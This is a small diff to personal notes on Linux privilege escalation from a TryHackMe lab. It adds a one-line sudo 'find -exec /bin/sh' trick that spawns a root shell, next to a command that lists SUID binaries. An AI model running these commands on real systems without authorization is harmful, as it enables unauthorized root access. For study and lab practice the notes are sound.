@@ -1,5 +1,9 @@
 Linux Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 
 
+via sudo
+
+1. sudo find . -exec /bin/sh \; -quit (basically finds the root shell)
+
 via SUID info 
 
 1. Run find / -type f -perm -04000 -ls 2>/dev/null to search for files that have the SUID bit set
